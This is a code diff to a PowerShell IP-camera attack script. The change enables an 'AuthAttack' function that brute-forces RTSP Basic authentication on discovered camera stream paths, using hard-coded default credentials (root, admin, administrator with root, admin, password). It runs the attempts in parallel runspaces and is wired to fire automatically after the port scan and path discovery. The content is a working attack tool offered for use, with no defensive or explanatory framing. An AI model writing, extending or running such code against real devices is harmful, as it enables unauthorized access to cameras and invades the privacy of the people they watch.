@@ -236,6 +236,8 @@ function Async-Runspaces {
             PortScan -Target $Target
         } elseif ($Option -eq "AttackCamera"){
             AttackCamera -Targets $Target
+        } elseif ($Option -eq "AuthAttack"){
+            AuthAttack -Targets $Target
         }
 
         # Poll the runspaces and display results as they complete
@@ -273,7 +275,12 @@ function Async-Runspaces {
                             continue
                         }
 
-                    }
+                    }elseif ($Option -eq "AuthAttack") {
+                        Write-Host -ForegroundColor Green "$result"
+                        #$ReturnedResult += $result
+                        
+                        }
+
                 }
             }
 
@@ -386,7 +393,7 @@ function AttackCamera {
 
 }
 
-<#
+
 function AuthAttack {
     [CmdletBinding(ConfirmImpact = 'None')]
     Param(
@@ -394,12 +401,13 @@ function AuthAttack {
         [string[]] $Targets
     ) 
 
-    #$Paths = @("", "MyPath", "MyScan", "axis/camera", "11/01", "MyStream")
+    $UserList = @("root","admin","administrator")
+    $PassList = @("root","admin", "password")
     $Timeout = 300
 
     $scriptBlock = {
         
-        param ($IP, $Timeout, $Port, $Path)
+        param ($IP, $Timeout, $Port, $Path, $authString)
 
             $tcpClient = New-Object System.Net.Sockets.TcpClient
             $asyncResult = $tcpClient.BeginConnect($IP, $Port, $null, $null)
@@ -417,8 +425,8 @@ function AuthAttack {
 
                             $CRLF = [char]13 + [char]10  # Carriage Return + Line Feed
                             $request = "DESCRIBE rtsp://$IP`:$Port/$Path RTSP/1.0$CRLF" +
-                                       "CSeq: 2$CRLF$CRLF" #+
-                                       #"Authorization: Basic YWRtaW46YWRtaW4=$CRLF$CRLF"
+                                       "CSeq: 2$CRLF" +
+                                       "Authorization: Basic $authString$CRLF$CRLF"
 
                             $Writer.Write($request)
                             $Writer.Flush()
@@ -460,21 +468,26 @@ function AuthAttack {
         
         foreach ($Target in $Targets) {
 
-            $IP = ($Target -split ':')[0]
-            [int]$Port = ($Target -split ':')[1]
+            $IP, $Port, $Paths = $Target -split "[:/]", 3
 
             foreach ($Path in $Paths) {
-                $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path)
-                $runspace.RunspacePool = $runspacePool
+                foreach($Username in $UserList){
+                    foreach($Password in $PassList){
+                        $authString = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$Username`:$Password"))
+                        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($IP).AddArgument($Timeout).AddArgument($Port).AddArgument($Path).AddArgument($authString)
+                        $runspace.RunspacePool = $runspacePool
                   
-                [void]$runspaces.Add([PSCustomObject]@{
-                    Runspace     = $runspace
-                    Handle       = $runspace.BeginInvoke()
-                    ComputerName = $IP
-                    Port         = $Port
-                    Path         = $Path
-                    Completed    = $false
-                })
+                        [void]$runspaces.Add([PSCustomObject]@{
+                            Runspace     = $runspace
+                            Handle       = $runspace.BeginInvoke()
+                            Auth         = $authString
+                            ComputerName = $IP
+                            Port         = $Port
+                            Path         = $Path
+                            Completed    = $false
+                        })
+                    }
+                }
             }   
         }
 
@@ -482,7 +495,7 @@ function AuthAttack {
 
 }
 
-#>
+
 [array]$AlivePorts = @()
 
     if ($Scan){
@@ -506,7 +519,13 @@ function AuthAttack {
 
         if ($AlivePorts){ 
             Start-Sleep -Milliseconds 500
-            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "AttackCamera"         
+            $PathsToAttack = Async-Runspaces -Target $AlivePorts -Option "AttackCamera"
+            if ($PathsToAttack){
+                #Run the AuthAttack function
+                Async-Runspaces -Target $PathsToAttack -Option "AuthAttack"
+            } else {
+                Write-Host -ForegroundColor Red "No Potential Paths were found to Attack."
+            }
 
         } else {
             Write-Host -ForegroundColor Red "No Devices with open RTSP ports were found on the target address/range."
